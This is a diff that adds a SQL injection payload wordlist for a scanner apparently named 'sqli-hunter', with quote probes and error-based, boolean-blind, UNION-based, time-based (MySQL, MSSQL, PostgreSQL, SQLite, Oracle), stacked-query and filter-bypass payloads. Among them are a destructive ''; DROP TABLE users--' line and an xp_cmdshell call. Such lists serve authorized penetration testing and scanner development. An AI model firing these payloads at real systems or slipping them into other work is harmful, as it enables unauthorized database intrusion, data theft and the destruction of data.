@@ -1,0 +1,88 @@
+# sqli-hunter payload wordlist
+# Format: one payload per line
+# Comments begin with #
+# Source: adapted from public security research & sqlmap project
+
+# ── Classic quote probes ──────────────────────────────────────────
+'
+''
+`
+')
+'))
+")
+"))
+
+# ── Error-based ───────────────────────────────────────────────────
+' OR 1=1--
+' OR '1'='1'--
+' OR '1'='1' /*
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' GROUP BY 1,2,--
+1' GROUP BY 1,2,3--
+' HAVING 1=1--
+' HAVING 1=0--
+
+# ── Boolean-blind ─────────────────────────────────────────────────
+' AND '1'='1
+' AND '1'='2
+' AND 1=1--
+' AND 1=2--
+1 AND 1=1
+1 AND 1=2
+' OR 1=1#
+' OR 1=2#
+1' AND '1'='1'--
+1' AND '1'='2'--
+') AND ('1'='1
+') AND ('1'='2
+
+# ── UNION-based ───────────────────────────────────────────────────
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+
+# ── Time-based (MySQL / MariaDB) ──────────────────────────────────
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+' OR SLEEP(5)--
+1 AND SLEEP(5)
+1; SELECT SLEEP(5)--
+
+# ── Time-based (MSSQL) ────────────────────────────────────────────
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+'; EXEC xp_cmdshell('WAITFOR DELAY ''0:0:5''')--
+
+# ── Time-based (PostgreSQL) ───────────────────────────────────────
+'; SELECT pg_sleep(5)--
+' AND 1=(SELECT 1 FROM pg_sleep(5))--
+' OR 1=(SELECT 1 FROM pg_sleep(5))--
+
+# ── Time-based (SQLite) ───────────────────────────────────────────
+' AND 1=randomblob(500000000)--
+' AND 1=(SELECT 1 FROM (SELECT RANDOMBLOB(500000000))a)--
+
+# ── Time-based (Oracle) ───────────────────────────────────────────
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--
+' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--
+
+# ── Stacked queries ───────────────────────────────────────────────
+'; SELECT 1--
+'; DROP TABLE users--
+1; SELECT 1=1
+
+# ── Special / bypass ──────────────────────────────────────────────
+'/**/OR/**/1=1--
+'%20OR%201=1--
+' /*!OR*/ 1=1--
+'||1=1--
+' OR 'unusual'='unusual
